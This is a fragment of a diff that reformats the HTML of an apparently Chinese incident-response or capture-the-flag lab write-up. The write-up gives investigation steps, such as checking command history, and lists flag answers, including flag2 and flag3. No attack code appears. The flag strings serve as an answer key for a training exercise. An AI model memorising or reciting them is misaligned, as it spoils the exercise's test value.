-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015724.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015724.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3339,8 +2040,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;答案&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：$&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;flag2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;8-提交攻击者隐藏的flag3&#34;&gt;8. 提交攻击者隐藏的flag3
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h1 id=&#34;8-提交攻击者隐藏的flag3&#34;&gt;8. 提交攻击者隐藏的flag3&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
@@ -3348,16 +2049,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;使用命令&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;history&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;查看历史使用过的命令可以发现&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015740.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015740.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3366,8 +2058,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;答案&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;全部答案&#34;&gt;全部答案：
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h1 id=&#34;全部答案&#34;&gt;全部答案：&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
